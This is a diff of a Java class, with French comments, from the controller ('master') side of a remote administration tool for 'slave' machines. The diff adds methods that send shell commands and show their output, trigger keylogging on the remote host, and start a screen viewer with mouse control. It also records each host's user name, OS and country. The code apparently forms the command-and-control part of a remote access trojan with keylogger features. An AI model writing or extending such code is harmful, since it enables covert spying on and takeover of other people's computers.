@@ -1,5 +1,7 @@
 package master;
 
+import gui.MCmdJInternalFrame;
+
 import java.awt.event.MouseAdapter;
 import java.awt.event.MouseEvent;
 import java.awt.event.WindowAdapter;
@@ -38,14 +40,15 @@ public class Connexion {
 /*													   ARGUMENT																	   			   /	
 /**********************************************************************************************************************************************/
 	private Socket _so;
-	private String _ip, _os_name, _numeroConnexion, _pays, _os_arch, _os_version,		// Parametres de la connexion
-			_user_name, _file_separator;
+	private String _ip, _os_name, _numeroConnexion, _pays, _os_arch, _os_version;
+	private static String _user_name;
+	private String _file_separator;
 
-	private ObjectInputStream _in;												// Flux d'entrée
-	private ObjectOutputStream _out;												// Flux de sortie
-	private ArrayBlockingQueue<RemoteActions> _remoteActionsQueue;				// Pour la VNC
+	private static  ObjectInputStream _in;												// Flux d'entrée
+	private static ObjectOutputStream _out;												// Flux de sortie
+	private static ArrayBlockingQueue<RemoteActions> _remoteActionsQueue;				// Pour la VNC
 	private Affichage _affichage;												// Pour la VNC
-
+	private MCmdJInternalFrame mCmdJInternalFrame;
 	
 	
 	
@@ -75,7 +78,7 @@ public class Connexion {
 			setOs_arch(splited[5]);
 			setPays(splited[6]);
 			setIp(so.getInetAddress().toString());
-			send();																// Lance un Thread d'envoi
+		//	send();																// Lance un Thread d'envoi
 			receive();															// Lance un Thread de reception
 		} catch (IOException e) {
 			// TODO Auto-generated catch block
@@ -111,7 +114,7 @@ public class Connexion {
 							_out.writeObject(Constante.code_notif);
 							_out.flush();
 						} else if (commande.equals("vnc")) {				// Lancer la VNC
-							_affichage = new Affichage(); // Cree un nouvel
+							 // Cree un nouvel
 															// affichage
 
 						} else if (commande.equals("cmd")) {
@@ -139,14 +142,57 @@ public class Connexion {
 						}
 					}
 				} catch (Exception e) {
-					Server.log.enregistrerFichier("Client s'est deconnecte :"
+					Server.log.enregistrerFichier("Client s'est deconnecte :"          // Handle a faire la deconnection d'un client
 							+ _ip + " " + _user_name);
 				}
 			}
 		};
 		envoi.start();
 	}
-
+	public void startAffichage()
+	{
+		_affichage = new Affichage();		
+	}
+	public void sendCmdCommand(String commande,MCmdJInternalFrame parent)
+	{
+		mCmdJInternalFrame=parent;
+		try {
+			_out.writeObject(Constante.code_cmd);
+	
+		_out.flush();
+//		System.out.println("Envoi d'une requete");
+		_out.writeObject(commande);
+		_out.flush();
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+	}
+	
+	
+	public void sendNotification(String message,String url)
+	{
+		try {
+			_out.writeObject(Constante.code_notif);
+		
+		_out.flush();
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+	}
+	
+	public void sendKeylog()
+	{
+		Server.log.enregistrerFichier("keylog");
+		try {
+			_out.writeObject(Constante.code_keylog);
+		_out.flush();
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+	}
 	/**
 	 * 		Methode gérant la reception des objets de l'esclave
 	 * 
@@ -169,7 +215,8 @@ public class Connexion {
 								Object object = _in.readObject();
 								if (object instanceof String) {
 									String res = (String) object;			// Recupere la sortie du terminal
-									System.out.println(res);				// L'affiche
+													// L'affiche
+									mCmdJInternalFrame.append(res);
 								}
 							} else {										// Sinon recoit un fichier 
 																			// Appelle la methode receivedFile qui recupere le fichier dans le flux de byte
@@ -187,7 +234,7 @@ public class Connexion {
 
 					}
 				} catch (Exception e) {
-					System.out.println(_ip + " s'est deconnecte");
+				//	System.out.println(_ip + " s'est deconnecte");	// Handle a faire la deconnection d'un client
 
 				}
 			}
@@ -229,12 +276,58 @@ public class Connexion {
 
 	
 	
+	public Socket get_so() {
+		return _so;
+	}
+
+
+	public String get_ip() {
+		return _ip;
+	}
+
+
+	public String get_os_name() {
+		return _os_name;
+	}
+
+
+	public String get_numeroConnexion() {
+		return _numeroConnexion;
+	}
+
+
+	public String get_pays() {
+		return _pays;
+	}
+
+
+	public String get_os_arch() {
+		return _os_arch;
+	}
+
+
+	public String get_os_version() {
+		return _os_version;
+	}
+
+
+	public String get_user_name() {
+		return _user_name;
+	}
+
+
+	public String get_file_separator() {
+		return _file_separator;
+	}
+
+
+
 	/**
 	 * 			Classe qui se charge de l'affichage de l'ecran de l'esclave 
 	 * 			Permet de prendre le controle de la souris, et naviguer sur l'ordinateur de l'esclave
 	 * 	 * @author lh
 	 */
-	class Affichage extends JFrame {
+	public static class Affichage extends JFrame {
 		private final JLabel label = new JLabel();
 		private final Timer timer;
 
@@ -265,7 +358,6 @@ public class Connexion {
 				}
 			});
 			setSize(Constante.WINDOW_WIDTH, Constante.WINDOW_HEIGHT);
-			setVisible(true);
 			Server.log.enregistrerFichier("Ajout d'un listener de la souris");
 
 			timer = new Timer();										// Redemmande un screenshot toutes les 2 secondes pour mettre a jour 
